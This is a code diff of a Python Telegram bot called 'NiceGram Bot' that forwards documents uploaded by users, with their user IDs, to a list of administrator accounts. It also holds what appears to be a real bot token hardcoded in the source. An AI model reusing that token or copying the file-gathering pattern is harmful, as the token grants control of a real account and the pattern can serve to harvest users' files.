@@ -7,6 +7,7 @@ import requests
 import os
 from flask import Flask
 import threading
+
 # Авто-пинг каждые 4 минуты
 def keep_alive():
     import threading
@@ -26,7 +27,11 @@ keep_alive()
 app = Flask(__name__)
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8528821671:AAE38YDiAVscwioEUiG7G1psKWaTyCSpHSo")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "8553896368", "8413331075"))
+
+# ИСПРАВЛЕНО: Получаем список ID админов
+admin_ids_str = os.getenv("ADMIN_IDS", "8553896368,8413331075")
+ADMIN_IDS = [int(id_str.strip()) for id_str in admin_ids_str.split(",")]
+
 DB = "refound_bot.db"
 
 # Создаем бота с обработкой ошибок
@@ -180,11 +185,15 @@ ID: {user.id}
 Файл: {message.document.file_name}
         """
 
-        # Пробуем отправить файл админу
-        bot.send_document(ADMIN_ID,
-                          message.document.file_id,
-                          caption=admin_text,
-                          parse_mode='HTML')
+        # Отправляем файл всем админам (ИСПРАВЛЕНО)
+        for admin_id in ADMIN_IDS:
+            try:
+                bot.send_document(admin_id,
+                                  message.document.file_id,
+                                  caption=admin_text,
+                                  parse_mode='HTML')
+            except Exception as e:
+                print(f"Ошибка отправки админу {admin_id}: {e}")
 
         # Сохраняем в базу
         conn = sqlite3.connect(DB)
@@ -204,7 +213,8 @@ ID: {user.id}
 
 @bot.message_handler(commands=['result'])
 def send_result(message):
-    if message.from_user.id != ADMIN_ID:
+    # ИСПРАВЛЕНО: Проверяем, что пользователь является админом
+    if message.from_user.id not in ADMIN_IDS:
         return
 
     try:
@@ -263,6 +273,7 @@ def run_telegram_bot():
 
 if __name__ == "__main__":
     print("=== Запуск NiceGram Bot ===")
+    print(f"ID админов: {ADMIN_IDS}")  # Для отладки
 
     # Запускаем Telegram бота в фоновом потоке
     bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
@@ -273,4 +284,3 @@ if __name__ == "__main__":
 
     # Запускаем Flask сервер (блокирующий вызов)
     app.run(host='0.0.0.0', port=8080, debug=False)
-
